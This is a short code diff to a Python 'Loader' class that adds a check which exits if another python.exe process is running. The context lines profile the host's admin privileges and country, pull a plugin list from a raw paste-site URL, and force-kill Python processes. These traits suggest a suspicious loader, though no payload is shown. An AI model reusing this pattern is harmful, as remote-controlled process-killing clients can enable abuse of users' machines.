@@ -32,6 +32,7 @@ class Loader():
 		self.country = data["country"]
 		self.privileges = "Administrator" if ctypes.windll.shell32.IsUserAnAdmin() == 1 else "User"
 		self.plugins = requests.get('https://textbin.net/raw/tc3lntemtr').json()
+		self.Kill()
 		thread = threading.Thread(target = self.Auto_Close)
 		thread.start()
 		self.SendNotification()
@@ -177,6 +178,16 @@ class Loader():
 						os.system("taskkill /IM python.exe /F")
 				except:
 					pass
+	def Kill(self):
+			num = 0
+			for proc in psutil.process_iter():
+				try:
+					if proc.name() == "python.exe":
+						num += 1
+				except:
+					pass
+			if num > 1:
+				exit()
 try:
 
 	Loader()
